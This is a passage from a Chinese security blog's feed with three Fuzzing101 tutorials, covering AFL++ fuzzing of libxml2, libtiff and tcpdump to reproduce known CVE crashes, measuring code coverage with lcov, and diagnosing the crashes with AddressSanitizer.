        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文是 Fuzzing101 训练的第五篇，fuzz 对象是 <strong>LibXML2</strong> XML 解析库，目标是找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2017-9048">CVE-2017-9048</a> 的崩溃。</p><p>CVE-2017-9048：堆栈缓冲区溢出漏洞，影响 LibXML2 的 DTD 验证功能。</p><h2 id="将会学到的知识"><a href="#将会学到的知识" class="headerlink" title="将会学到的知识"></a>将会学到的知识</h2><ul><li>使用自定义字典帮助模糊器找到新的执行路径</li><li>跨多个核心并行化模糊测试工作</li></ul><h2 id="环境与搭建"><a href="#环境与搭建" class="headerlink" title="环境与搭建"></a>环境与搭建</h2><h3 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h3><p>为新项目创建一个文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir Fuzzing_libxml2 &amp;&amp; cd Fuzzing_libxml2</span><br></pre></td></tr></table></figure><p>下载并解压 libxml2-2.9.4.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;xmlsoft.org&#x2F;download&#x2F;libxml2-2.9.4.tar.gz</span><br><span class="line">tar xvf libxml2-2.9.4.tar.gz &amp;&amp; cd libxml2-2.9.4&#x2F;</span><br></pre></td></tr></table></figure><p>构建并安装 libxml2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-dev</span><br><span class="line">CC&#x3D;afl-clang-lto CXX&#x3D;afl-clang-lto++ CFLAGS&#x3D;&quot;-fsanitize&#x3D;address&quot; CXXFLAGS&#x3D;&quot;-fsanitize&#x3D;address&quot; LDFLAGS&#x3D;&quot;-fsanitize&#x3D;address&quot; .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;Fuzzing_libxml2&#x2F;libxml2-2.9.4&#x2F;install&quot; --disable-shared --without-debug --without-ftp --without-http --without-legacy --without-python LIBS&#x3D;&#39;-ldl&#39;</span><br><span class="line">make -j$(nproc)</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>现在，我们可以测试一切是否正常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;xmllint --memory .&#x2F;test&#x2F;wml.xml</span><br></pre></td></tr></table></figure><p>将会看到：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe5/1650424918587970/46929b712a3b5b10450b357eac590f282daa69d4.png" alt="image-20220420112158186"></p><h3 id="种子语料库创建"><a href="#种子语料库创建" class="headerlink" title="种子语料库创建"></a>种子语料库创建</h3><p>首先，我们需要获取一些 XML 样本。我们将使用此存储库中提供的<strong>SampleInput.xml</strong>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir afl_in &amp;&amp; cd afl_in</span><br><span class="line">wget https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;antonio-morales&#x2F;Fuzzing101&#x2F;main&#x2F;Exercise%205&#x2F;SampleInput.xml</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure><p>这里要注意的是：SampleInput.xml 文件用指令下载不了，所以我这边直接在虚拟机创建了一个文件，然后将内容复制了进去，然后再改名。</p><h3 id="自定义词典"><a href="#自定义词典" class="headerlink" title="自定义词典"></a>自定义词典</h3><p>创建一个 XML 字典。或者，可以使用 AFL++ 提供的 XML 字典：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir dictionaries &amp;&amp; cd dictionaries</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;AFLplusplus&#x2F;AFLplusplus&#x2F;blob&#x2F;stable&#x2F;dictionaries&#x2F;xml.dict</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure><h2 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h2><p>用 <code>--valid</code> 参数来捕捉错误，用 <code>-x</code> 设置字典路径，用 <code>-D</code> 启用确定性突变（仅适用于主模糊器）：</p><p>例如，我使用以下命令运行了 fuzzer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i .&#x2F;afl_in -o afl_out -s 123 -x .&#x2F;dictionaries&#x2F;xml.dict -D -M master -- .&#x2F;xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br></pre></td></tr></table></figure><p>可以使用以下命令运行另一个从属实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i .&#x2F;afl_in -o afl_out -s 234 -S slave1 -- .&#x2F;xmllint --memory --noenc --nocdata --dtdattr --loaddtd --valid --xinclude @@</span><br></pre></td></tr></table></figure><p>命令行各参数意义：<a href="https://securitylab.github.com/research/fuzzing-challenges-solutions-1/">https://securitylab.github.com/research/fuzzing-challenges-solutions-1/</a></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe5/1650425906629062/b9bddfd5e20a9bd0801d2b951187d03c9179ca9b.png" alt="image-20220420113826267"></p><p>因为本文要了解的字典和多核并行模糊测试都演示了，而且结果要跑很久才有，这里就不展示结果了。</p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101-exe4</title>
      <link href="/2022/04/19/Fuzzing101-exe4/"/>
      <url>/2022/04/19/Fuzzing101-exe4/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文是 Fuzzing101 训练的第四篇，fuzz 对象是 libtiff 4.0.4，目标是找到 <a href="https://www.cvedetails.com/cve/CVE-2016-9297/">CVE-2016-9297</a> 的漏洞崩溃，并测量崩溃的代码覆盖率。</p><p>CVE-2016-9297：越界读取漏洞，可以通过精心设计的 TIFF_SETGET_C16ASCII 或 TIFF_SETGET_C32_ASCII 标记值触发。越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞。将造成的结果是它允许远程攻击者导致拒绝服务或可能从进程内存中获取潜在的敏感信息。</p><h2 id="将会学到的知识"><a href="#将会学到的知识" class="headerlink" title="将会学到的知识"></a>将会学到的知识</h2><ul><li>如何使用 LCOV 测量代码覆盖率</li><li>如何使用代码覆盖率数据来提高 fuzzing 的有效性</li></ul><h2 id="环境与搭建"><a href="#环境与搭建" class="headerlink" title="环境与搭建"></a>环境与搭建</h2><h3 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h3><p>为新项目创建一个文件夹：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tiff &amp;&amp; cd fuzzing_tiff&#x2F;</span><br></pre></td></tr></table></figure><p>下载并解压 libtiff 4.0.4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;download.osgeo.org&#x2F;libtiff&#x2F;tiff-4.0.4.tar.gz</span><br><span class="line">tar -xzvf tiff-4.0.4.tar.gz</span><br></pre></td></tr></table></figure><p>构建和安装 libtiff：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd tiff-4.0.4&#x2F;</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>作为目标二进制文件，我们可以对位于 /bin 文件夹中的 tiffinfo 二进制文件进行模糊测试。 作为种子输入语料库，我们将使用 /test/images/ 文件夹中的示例图像。</p><p>要测试一切是否正常，只需键入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;bin&#x2F;tiffinfo -D -j -c -r -s -w $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;test&#x2F;images&#x2F;palette-1c-1b.tiff</span><br></pre></td></tr></table></figure><p>将会看到</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe4/1650335393019317/5002287b11a72928078ac8a9527b55856e6ea184.png" alt="image-20220419102952750"></p><p><code>-j -c -r -s -w</code> 是为了提高<strong>代码覆盖率</strong>并增加发现错误的机会。</p><h2 id="代码覆盖率"><a href="#代码覆盖率" class="headerlink" title="代码覆盖率"></a>代码覆盖率</h2><p>代码覆盖率是一种软件指标，显示每行代码被触发的次数。通过使用代码覆盖率，我们将了解模糊器已到达代码的哪些部分并可视化模糊测试过程。</p><p>先安装lcov</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install lcov</span><br></pre></td></tr></table></figure><p>使用<code>--coverage</code>标志（编译器和链接器）重建 libTIFF：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME&#x2F;fuzzing_tiff&#x2F;install</span><br><span class="line">cd $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;</span><br><span class="line">make clean</span><br><span class="line">  </span><br><span class="line">CFLAGS&#x3D;&quot;--coverage&quot; LDFLAGS&#x3D;&quot;--coverage&quot; .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>通过键入以下内容来收集代码覆盖率数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;</span><br><span class="line">lcov --zerocounters --directory .&#x2F;</span><br><span class="line">lcov --capture --initial --directory .&#x2F; --output-file app.info</span><br><span class="line">$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;bin&#x2F;tiffinfo -D -j -c -r -s -w $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;test&#x2F;images&#x2F;palette-1c-1b.tiff</span><br><span class="line">lcov --no-checksum --directory .&#x2F; --capture --output-file app2.info</span><br></pre></td></tr></table></figure><p>解释每个命令：</p><ul><li><code>lcov --zerocounters --directory ./</code>：重置以前的计数器</li><li><code>lcov --capture --initial --directory ./ --output-file app.info</code>：返回包含每条检测线的零覆盖率的“基线”覆盖率数据文件</li><li><code>$HOME/fuzzing_tiff/install/bin/tiffinfo -D -j -c -r -s -w $HOME/fuzzing_tiff/tiff-4.0.4/test/images/palette-1c-1b.tiff</code>：运行要分析的应用程序。可以使用不同的输入多次运行它</li><li><code>lcov --no-checksum --directory ./ --capture --output-file app2.info</code>：将当前覆盖状态保存到 app2.info 文件中</li></ul><p>生成 HTML 输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory .&#x2F;html-coverage&#x2F; .&#x2F;app2.info</span><br></pre></td></tr></table></figure><p>如果一切顺利，结果会放在 <code>./html-coverage/index.html</code> 文件，将会看到如下内容：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe4/1650351617807513/26b06d6975d1027da931b81e6d8191776745ac86.png" alt="image-20220419150017463"></p><h2 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h2><p>现在我们将在启用 ASAN 的情况下编译 libtiff。</p><p>清理所有之前编译的目标文件和可执行文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME&#x2F;fuzzing_tiff&#x2F;install</span><br><span class="line">cd $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><p>调用 make 之前设置 AFL_USE_ASAN=1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">export LLVM_CONFIG&#x3D;&quot;llvm-config-11&quot;</span><br><span class="line">CC&#x3D;afl-clang-lto .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;&quot; --disable-shared</span><br><span class="line">AFL_USE_ASAN&#x3D;1 make -j4</span><br><span class="line">AFL_USE_ASAN&#x3D;1 make install</span><br></pre></td></tr></table></figure><p>现在就可以使用以下命令运行模糊器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;test&#x2F;images&#x2F; -o $HOME&#x2F;fuzzing_tiff&#x2F;out&#x2F; -s 123 -- $HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;bin&#x2F;tiffinfo -D -j -c -r -s -w @@</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe4/1650353654934655/f36b20b915e461dd2f0739cafcf2a917edb2283d.png" alt="image-20220419153414672"></p><h3 id="ASan-诊断"><a href="#ASan-诊断" class="headerlink" title="ASan 诊断"></a>ASan 诊断</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;bin&#x2F;tiffinfo -D -j -c -r -s -w &#x2F;home&#x2F;gyx&#x2F;fuzzing_tiff&#x2F;out&#x2F;default&#x2F;crashes&#x2F;id:000000,sig:06,src:000092,time:104764,execs:96551,op:havoc,rep:8</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe4/1650353945336428/bc0c62a41cc522eeb7bba545db8c13317ed6ff91.png" alt="image-20220419153905071"></p><h2 id="测量-PoC-的代码覆盖率"><a href="#测量-PoC-的代码覆盖率" class="headerlink" title="测量 PoC 的代码覆盖率"></a>测量 PoC 的代码覆盖率</h2><p>也就是把之前 <code>代码覆盖率</code> 部分再执行一遍，并将目标文件改成 crash 的文件就行，即</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME&#x2F;fuzzing_tiff&#x2F;install</span><br><span class="line">cd $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;</span><br><span class="line">make clean</span><br><span class="line">  </span><br><span class="line">CFLAGS&#x3D;&quot;--coverage&quot; LDFLAGS&#x3D;&quot;--coverage&quot; .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;&quot; --disable-shared</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME&#x2F;fuzzing_tiff&#x2F;tiff-4.0.4&#x2F;</span><br><span class="line">lcov --zerocounters --directory .&#x2F;</span><br><span class="line">lcov --capture --initial --directory .&#x2F; --output-file app.info</span><br><span class="line">$HOME&#x2F;fuzzing_tiff&#x2F;install&#x2F;bin&#x2F;tiffinfo -D -j -c -r -s -w &#x2F;home&#x2F;gyx&#x2F;fuzzing_tiff&#x2F;out&#x2F;default&#x2F;crashes&#x2F;id:000000,sig:06,src:000092,time:104764,execs:96551,op:havoc,rep:8</span><br><span class="line">lcov --no-checksum --directory .&#x2F; --capture --output-file app2.info</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">genhtml --highlight --legend -output-directory .&#x2F;html-coverage&#x2F; .&#x2F;app2.info</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe4/1650355178612074/e66fc350f0ab485e3b7d0ab33e0963039923397a.png" alt="image-20220419155938393"></p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101-exe3</title>
      <link href="/2022/04/17/Fuzzing101-exe3/"/>
      <url>/2022/04/17/Fuzzing101-exe3/</url>
      
        <content type="html"><![CDATA[<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>本文是 Fuzzing101 训练的第三篇，fuzz 对象是 4.9.2 版本的 TCPdump 数据包分析器。目标是找到 <a href="https://www.cvedetails.com/cve/CVE-2017-13028/">CVE-2017-13028</a> 漏洞崩溃。</p><p>CVE-2017-13028 是一个<strong>越界读取漏洞</strong>，可以通过 BOOTP 数据包（引导协议）触发。越界读取是当程序读取超出预期缓冲区末尾或开头之前的数据时发生的漏洞。</p><h2 id="将会学到的知识"><a href="#将会学到的知识" class="headerlink" title="将会学到的知识"></a>将会学到的知识</h2><ul><li>什么是 ASan</li><li>如何使用 ASan</li><li>ASan 对崩溃分类的展示</li></ul><h2 id="环境与搭建"><a href="#环境与搭建" class="headerlink" title="环境与搭建"></a>环境与搭建</h2><h3 id="下载并构建目标"><a href="#下载并构建目标" class="headerlink" title="下载并构建目标"></a>下载并构建目标</h3><p>为项目创建一个文件夹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME</span><br><span class="line">mkdir fuzzing_tcpdump &amp;&amp; cd fuzzing_tcpdump&#x2F;</span><br></pre></td></tr></table></figure><p>下载并解压 tcpdump-4.9.2.tar.gz</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;the-tcpdump-group&#x2F;tcpdump&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;tcpdump-4.9.2.tar.gz</span><br><span class="line">tar -xzvf tcpdump-4.9.2.tar.gz</span><br></pre></td></tr></table></figure><p>我们还需要下载 TCPdump 需要的跨平台库 libpcap。下载并解压 libpcap-1.8.0.tar.gz：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;the-tcpdump-group&#x2F;libpcap&#x2F;archive&#x2F;refs&#x2F;tags&#x2F;libpcap-1.8.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.8.0.tar.gz</span><br></pre></td></tr></table></figure><p>我们需要重命名<code>libpcap-libpcap-1.8.0</code>为<code>libpcap-1.8.0</code>. 否则，tcpdump 找不到<code>libpcap.a</code>本地路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv libpcap-libpcap-1.8.0&#x2F; libpcap-1.8.0</span><br></pre></td></tr></table></figure><p>构建并安装 libpcap：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME&#x2F;fuzzing_tcpdump&#x2F;libpcap-1.8.0&#x2F;</span><br><span class="line">.&#x2F;configure --enable-shared&#x3D;no</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>构建和安装 tcpdump：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME&#x2F;fuzzing_tcpdump&#x2F;tcpdump-tcpdump-4.9.2&#x2F;</span><br><span class="line">.&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;&quot;</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>键入以下指令查看是否配置成功：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;sbin&#x2F;tcpdump -h</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe3/1650203568639882/a35694d9a884d26f4055e10b153c58546b066d81.png" alt="image-20220417215248476"></p><h3 id="种子语料库创建"><a href="#种子语料库创建" class="headerlink" title="种子语料库创建"></a>种子语料库创建</h3><p>种子语料库：为<strong>提供模糊的初始覆盖</strong>而准备的一个小型初始语料库。种子语料库不是由fuzzers自己创建的，通常是从现有的测试输入准备的，或者可以手工制作以提供有趣的覆盖范围。它们经常与模糊目标一起检入源代码。</p><p>我们可以在 <code>$HOME/fuzzing_tcpdump/tcpdump-tcpdump-4.9.2/tests</code> 中找到很多 .pcacp 示例，可以用以下命令行运行这些 .pcacp 文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;sbin&#x2F;tcpdump -vvvvXX -ee -nn -r [.pcap file]</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;sbin&#x2F;tcpdump -vvvvXX -ee -nn -r .&#x2F;tests&#x2F;geneve.pcap</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe3/1650248479656472/addd76bcbeea19ce92d71e43d359d5e3a3ae70c6.png" alt="image-20220418102119412"></p><h2 id="ASan"><a href="#ASan" class="headerlink" title="ASan"></a><strong>ASan</strong></h2><p><strong>AddressSanitizer (ASan)**是用于 C 和 C++ 的快速内存错误检测器。它由一个编译器检测模块和一个运行时库组成。该工具能够发现</strong>对堆、堆栈和全局对象的越界访问<strong>，以及</strong>释放后使用、双重释放和内存泄漏**错误。如今被移值到 &gt;=4.8 版本的 GCC 中。</p><h3 id="在启用-ASan-的情况下构建"><a href="#在启用-ASan-的情况下构建" class="headerlink" title="在启用 ASan 的情况下构建"></a>在启用 ASan 的情况下构建</h3><p>现在我们将构建启用 ASAN 的 tcpdump（和 libpcap）。</p><p>首先，我们要清理所有之前编译的目标文件和可执行文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rm -r $HOME&#x2F;fuzzing_tcpdump&#x2F;install</span><br><span class="line">cd $HOME&#x2F;fuzzing_tcpdump&#x2F;libpcap-1.8.0&#x2F;</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line">cd $HOME&#x2F;fuzzing_tcpdump&#x2F;tcpdump-tcpdump-4.9.2&#x2F;</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><p>现在，我们在调用 configure 和 make 之前设置 AFL_USE_ASAN=1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cd $HOME&#x2F;fuzzing_tcpdump&#x2F;libpcap-1.8.0&#x2F;</span><br><span class="line">export LLVM_CONFIG&#x3D;&quot;llvm-config-11&quot;</span><br><span class="line">CC&#x3D;afl-clang-lto .&#x2F;configure --enable-shared&#x3D;no --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;&quot;</span><br><span class="line">AFL_USE_ASAN&#x3D;1 make</span><br><span class="line"></span><br><span class="line">cd $HOME&#x2F;fuzzing_tcpdump&#x2F;tcpdump-tcpdump-4.9.2&#x2F;</span><br><span class="line">AFL_USE_ASAN&#x3D;1 CC&#x3D;afl-clang-lto .&#x2F;configure --prefix&#x3D;&quot;$HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;&quot;</span><br><span class="line">AFL_USE_ASAN&#x3D;1 make</span><br><span class="line">AFL_USE_ASAN&#x3D;1 make install</span><br></pre></td></tr></table></figure><h2 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h2><h3 id="运行模糊器"><a href="#运行模糊器" class="headerlink" title="运行模糊器"></a>运行模糊器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -m none -i $HOME&#x2F;fuzzing_tcpdump&#x2F;tcpdump-tcpdump-4.9.2&#x2F;tests&#x2F; -o $HOME&#x2F;fuzzing_tcpdump&#x2F;out&#x2F; -s 123 -- $HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;sbin&#x2F;tcpdump -vvvvXX -ee -nn -r @@</span><br></pre></td></tr></table></figure><p>参数解释：</p><ul><li><code>-i</code>：输入目录</li><li><code>-m</code>：内存限制</li><li><code>-o</code>：输出目录</li><li><code>-s</code>：设置固定种子</li><li><code>@@</code>：指代文件</li><li><code>-</code>：间隔符</li></ul><p>这里使用了-m参数，是因为在使用ASAN模式下对内存的消耗非常大，这里指定<code>-m none</code>就是指定禁用内存限制。</p><p>结果：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe3/1650274532756738/176cf487bbd1c0448ff20000ff883abb80ff83d3.png" alt="image-20220418173532342"></p><h3 id="利用-ASan-诊断"><a href="#利用-ASan-诊断" class="headerlink" title="利用 ASan 诊断"></a>利用 ASan 诊断</h3><p>调试使用 ASan 构建的程序比前面的练习要容易得多。我们只需要想程序提供崩溃文件就行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$HOME&#x2F;fuzzing_tcpdump&#x2F;install&#x2F;sbin&#x2F;tcpdump -vvvvXX -ee -nn -r &#39;&#x2F;home&#x2F;gyx&#x2F;fuzzing_tcpdump&#x2F;out&#x2F;default&#x2F;crashes&#x2F;id:000000,sig:06,src:001143,time:2462367,execs:1002839,op:havoc,rep:2&#39;</span><br></pre></td></tr></table></figure><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Fuzzing101-exe3/1650274952123115/b2498cee246aefb53a29d2424860de277e3c9910.png" alt="image-20220418174231894"></p><p>可以看到它已经给出了漏洞点，也给出了执行跟踪</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;850830&#x3D;&#x3D;ERROR: AddressSanitizer: heap-buffer-overflow on address 0x6080000000fb at pc 0x0000004f5bc5 bp 0x7ffeee5d97c0 sp 0x7ffeee5d97b8</span><br></pre></td></tr></table></figure><p>是一个堆的缓冲区溢出。</p>]]></content>
      
      
      <categories>
          
          <category> fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> fuzz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内核pwn初探之栈</title>
      <link href="/2022/04/12/%E5%86%85%E6%A0%B8pwn%E5%88%9D%E6%8E%A2%E4%B9%8B%E6%A0%88/"/>
      <url>/2022/04/12/%E5%86%85%E6%A0%B8pwn%E5%88%9D%E6%8E%A2%E4%B9%8B%E6%A0%88/</url>
      
